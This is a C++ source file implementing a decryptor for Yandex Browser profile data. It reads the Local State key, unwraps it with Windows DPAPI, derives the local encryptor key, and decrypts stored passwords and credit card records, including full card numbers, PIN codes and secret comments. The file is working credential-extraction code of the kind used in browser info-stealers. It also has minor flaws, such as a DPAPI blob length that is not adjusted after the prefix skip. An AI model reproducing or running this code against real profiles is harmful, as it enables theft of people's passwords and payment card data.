#include <fstream>
#include <filesystem>
#include <vector>

#include <ntstatus.h>
#include <windows.h>

#include "yadecryptor.h"
#include "base64.h"
#include "aes_256_gcm_decryptor.h"
#include "sha1.h"

namespace fs = std::filesystem;
using json = nlohmann::json;

YaDecryptor::YaDecryptor(const char *user_data_path, const char *profile_name)
: _user_data_path(user_data_path),
  _profile_name(profile_name)
{
  fs::path profile_path = _user_data_path;

  _local_state_path = (profile_path / "Local State").string();

  profile_path /= _profile_name;

  _profile_path = profile_path.string();

  _passwords_path = (profile_path / "Ya Passman Data").string();
  _cards_path     = (profile_path / "Ya Credit Cards").string();
  _cookies_path = (profile_path / "Network" / "Cookies").string();
}

YaDecryptor::~YaDecryptor()
{
}

std::string YaDecryptor::decrypt_ls_key(std::string &key_base64)
{
  char *dpapi_key = new char[key_base64.size()];

  unsigned int dpapi_key_size = base64_decode(key_base64.c_str(), key_base64.size(), dpapi_key);

  if (memcmp(dpapi_key, "DPAPI", 5) != 0) {
    throw std::exception("Key prefix incorrect");
  }

  DATA_BLOB in;
  DATA_BLOB out;

  in.pbData = (BYTE *)dpapi_key + 5; // skip DPAPI prefix
  in.cbData = dpapi_key_size;

  if (!CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
    throw std::exception("Cannot decrypt dpapi key");
  }

  // 32 bytes of key for aes-256-gcm

  if (out.cbData != 32) {
    throw std::exception("Decrypted dpapi key's size incorrect");
  }

  return std::string((char *)out.pbData, 32);
}

void YaDecryptor::init()
{
  std::ifstream f(_local_state_path);

  json data = json::parse(f);

  // Get base64 key
  std::string key_base64 = data["os_crypt"]["encrypted_key"];

  // Decrypt dpapi blob to retrieve key
  _ls_key = decrypt_ls_key(key_base64);
}

std::string YaDecryptor::get_le_key(sqlite3 *db_ctx)
{
  sqlite3_stmt *stmt_le{ 0 };

  try {
    if (sqlite3_prepare_v2(db_ctx, "SELECT value FROM meta WHERE key = 'local_encryptor_data'", -1, &stmt_le, NULL) != SQLITE_OK)
    {
      throw std::exception("Cannot prepare statement to read local_encryptor_data");
    }

    if (sqlite3_step(stmt_le) != SQLITE_ROW) {
      throw std::exception("Cannot get local_encryptor_data");
    }

    auto local_encryptor_data = sqlite3_column_text(stmt_le, 0);
    auto local_encryptor_data_size = sqlite3_column_bytes(stmt_le, 0);

    std::string str_encryptor_data((const char *)local_encryptor_data, local_encryptor_data_size);

    // find encrypted 96 bytes blob
    auto index_enc_data = str_encryptor_data.find("v10");

    // + 3 bytes to skip v10 prefix
    std::string encrypted_key_blob = str_encryptor_data.substr(index_enc_data + 3, 96);

    // decrypt local_encryptor_data

    const uint8_t *uint_encrypted_key_blob = (const uint8_t *)encrypted_key_blob.c_str();

    size_t tmp;

    std::string decrypted_data;
    decrypted_data.resize(68);

    Aes256GcmDecryptor aes_decryptor;

    aes_decryptor.init((const uint8_t *)_ls_key.c_str(), _ls_key.size());

    aes_decryptor.decrypt((uint8_t *)decrypted_data.c_str(), &tmp, 68, uint_encrypted_key_blob, 12,
      uint_encrypted_key_blob + 12, encrypted_key_blob.size() - 12, NULL, 0);

    // check signature
    if (*((const uint32_t *)decrypted_data.c_str()) != 0x20120108) {
      throw std::exception("Signature of decrypted local_encryptor_data incorrect");
    }

    // get decrypted key 32 bytes key to decrypt passwords
    return decrypted_data.substr(4, 32);
  }
  catch (...) {
    sqlite3_finalize(stmt_le);

    throw;
  }
}

std::vector<decrypted_password_t> YaDecryptor::get_passwords()
{
  std::vector<decrypted_password_t> passwords;

  sqlite3 *db_ctx{ 0 };
  sqlite3_stmt *stmt{ 0 };

  try {
    if (sqlite3_open_v2(_passwords_path.c_str(), &db_ctx, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
      throw std::exception("Cannot open password datatabe");
    }

    std::string le_key = get_le_key(db_ctx);

    if (sqlite3_prepare_v2(db_ctx, "SELECT origin_url, username_value, password_value, signon_realm FROM logins", -1, &stmt, NULL) != SQLITE_OK)
    {
      throw std::exception("Cannot prepare statement to read logins");
    }

    char hash[21];
    char decrypted_password[8192];
    size_t decrypted_password_size;

    Aes256GcmDecryptor aes_decryptor;

    aes_decryptor.init((const uint8_t *)le_key.c_str(), le_key.size());

    while (sqlite3_step(stmt) == SQLITE_ROW) {
      try {
        const char *url = (const char *)sqlite3_column_text(stmt, 0);
        const char *username = (const char *)sqlite3_column_text(stmt, 1);
        const char *password = (const char *)sqlite3_column_text(stmt, 2);
        int password_size = sqlite3_column_bytes(stmt, 2);

        const char *signon_realm = (const char *)sqlite3_column_text(stmt, 3);

        // Calculate sha1 hash for AAD
        // url + 0x00, 0x00 + username + 0x00, 0x00 + signon_realm

        std::string str_to_hash((const char *)url);
        str_to_hash.push_back('\0');
        str_to_hash.push_back('\0');
        str_to_hash += username;
        str_to_hash.push_back('\0');
        str_to_hash.push_back('\0');
        str_to_hash += signon_realm;

        SHA1(hash, str_to_hash.c_str(), str_to_hash.size());

        // Here we have 20 bytes AAD

          aes_decryptor.decrypt((uint8_t *)decrypted_password, &decrypted_password_size, sizeof(decrypted_password),
            (const uint8_t *)password, 12, (const uint8_t *)password + 12, password_size - 12, (const uint8_t *)hash, 20);

        decrypted_password[decrypted_password_size] = '\0';

        passwords.push_back({ url, username, decrypted_password });
      }
      catch (...) {
        continue;
      }
    }
  } catch (...) {
    sqlite3_finalize(stmt);
    sqlite3_close(db_ctx);

    throw;
  }

  return passwords;
}

std::vector<decrypted_cc_t> YaDecryptor::get_credit_cards()
{
  std::vector<decrypted_cc_t> credit_cards;

  sqlite3 *db_ctx{ 0 };
  sqlite3_stmt *stmt{ 0 };

  try {
    if (sqlite3_open_v2(_cards_path.c_str(), &db_ctx, SQLITE_OPEN_READONLY, NULL) != SQLITE_OK) {
      throw std::exception("Cannot open password datatabe");
    }

    std::string le_key = get_le_key(db_ctx);

    if (sqlite3_prepare_v2(db_ctx, "SELECT guid, public_data, private_data FROM records", -1, &stmt, NULL) != SQLITE_OK)
    {
      throw std::exception("Cannot prepare statement to read logins");
    }

    char decrypted_private[8192];
    size_t decrypted_private_size;

    Aes256GcmDecryptor aes_decryptor;

    aes_decryptor.init((const uint8_t *)le_key.c_str(), le_key.size());

    while (sqlite3_step(stmt) == SQLITE_ROW) {
      try {
        // guid need for AAD

        const char *guid = (const char *)sqlite3_column_text(stmt, 0);
        const char *public_data = (const char *)sqlite3_column_text(stmt, 1);
        const char *private_data = (const char *)sqlite3_column_text(stmt, 2);
        int guid_size = sqlite3_column_bytes(stmt, 0);
        int private_data_size = sqlite3_column_bytes(stmt, 2);

          aes_decryptor.decrypt((uint8_t *)decrypted_private, &decrypted_private_size, sizeof(decrypted_private),
            (const uint8_t *)private_data, 12, (const uint8_t *)private_data + 12, private_data_size - 12,
            (const uint8_t *)guid, guid_size);

        decrypted_private[decrypted_private_size] = '\0';

        json parsed_private_data = json::parse(decrypted_private);
        json parsed_public_data = json::parse(public_data);

        credit_cards.push_back({ parsed_private_data["full_card_number"],
          parsed_private_data["pin_code"], parsed_private_data["secret_comment"],
          parsed_public_data["card_holder"], parsed_public_data["card_title"],
          parsed_public_data["expire_date_year"], parsed_public_data["expire_date_month"] });
      }
      catch (...) {
        continue;
      }
    }
  }
  catch (...) {
    sqlite3_finalize(stmt);
    sqlite3_close(db_ctx);

    throw;
  }

  return credit_cards;
}